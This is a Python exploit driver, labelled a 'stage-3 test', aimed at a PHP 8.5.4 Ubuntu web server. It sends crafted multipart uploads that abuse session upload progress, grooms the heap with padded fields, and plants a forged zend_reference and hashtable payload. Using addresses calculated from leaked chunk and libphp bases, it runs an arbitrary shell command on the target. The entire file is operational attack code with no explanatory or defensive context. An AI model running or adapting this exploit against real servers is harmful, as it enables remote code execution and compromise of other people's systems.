#!/usr/bin/env python3
"""Stage-3 test using the calibrated PHP 8.5.4 Ubuntu geometry."""

from __future__ import annotations

import argparse
import struct

import exploit


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--url", default="http://127.0.0.1/index.php")
    parser.add_argument("--chunk", type=lambda value: int(value, 0), required=True)
    parser.add_argument("--libphp", type=lambda value: int(value, 0), required=True)
    parser.add_argument("--cmd", default="id>/tmp/p1")
    parser.add_argument("--pad-count", type=int, default=123)
    parser.add_argument("--fillers", type=int, default=100)
    parser.add_argument(
        "--htdata-offset",
        type=lambda value: int(value, 0),
        default=0x7C0D8,
    )
    parser.add_argument(
        "--zif-offset",
        type=lambda value: int(value, 0),
        default=0x3DDA90,
    )
    args = parser.parse_args()

    target = exploit.Target(args.url, timeout=40.0, verbose=True)
    ex = exploit.Exploit(
        target,
        args.cmd,
        zif_offset=args.zif_offset,
        dtor_offset=0x5E8DC0,
        htdata_offset=args.htdata_offset,
        profile="ubuntu855",
        verbose=True,
    )

    ex.stage3_pads = [(8, 7)] * args.pad_count
    a_parts = [
        {"name": "PHPSESSID", "data": b"a" * 19},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"p" * 3},
    ]
    for index, (name_length, value_length) in enumerate(ex.stage3_pads):
        name = (
            f"p{index:0{name_length - 1}d}" if name_length > 0 else ""
        )[:name_length]
        a_parts.append({"name": name, "data": b"V" * value_length})
    a_parts.extend([ex._file_part(), ex._big_field()])
    target.post(
        exploit.build_multipart(a_parts, b"S" * 17),
        b"S" * 17,
        read_cap=1 << 20,
        timeout=90.0,
        extra_headers={"Cookie": "PHPSESSID=" + "a" * 32},
    )

    htdata = args.chunk + args.htdata_offset
    zif = args.libphp + args.zif_offset
    ht, _ref = ex._fake_payload(htdata, zif)
    # The calibrated bin-80 allocation lands eight bytes before R0. Build
    # the complete zend_reference inside it instead of relying on stale bytes.
    carrier = (
        b"P" * 8
        + struct.pack("<II", 1, 0x1A)
        + struct.pack("<Q", htdata)
        + struct.pack("<Q", 0x307)
        + b"Q" * 8
    )

    b_parts = [
        {"name": "PHPSESSID", "data": exploit.SID},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
    ]
    for index in range(args.fillers):
        b_parts.append({"name": f"x{index:04d}", "data": b"Z" * 40})
    b_parts.extend(
        [
            {"name": "f00", "data": b"A" * 40},
            {"name": "f01", "data": carrier},
            {"name": "g00", "data": b"B" * 40},
        ]
    )
    for index in range(15):
        b_parts.append(
            {"name": f"a{index:030d}"[:31], "data": ht}
        )

    print(f"[*] chunk=0x{args.chunk:x} libphp=0x{args.libphp:x}", flush=True)
    print(f"[*] htdata=0x{htdata:x} zif=0x{zif:x}", flush=True)
    response = target.post(
        exploit.build_multipart(b_parts, b"B" * 10),
        b"B" * 10,
        read_cap=65536,
        timeout=40.0,
    )
    print(response[:4096].decode("latin1", "replace"))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
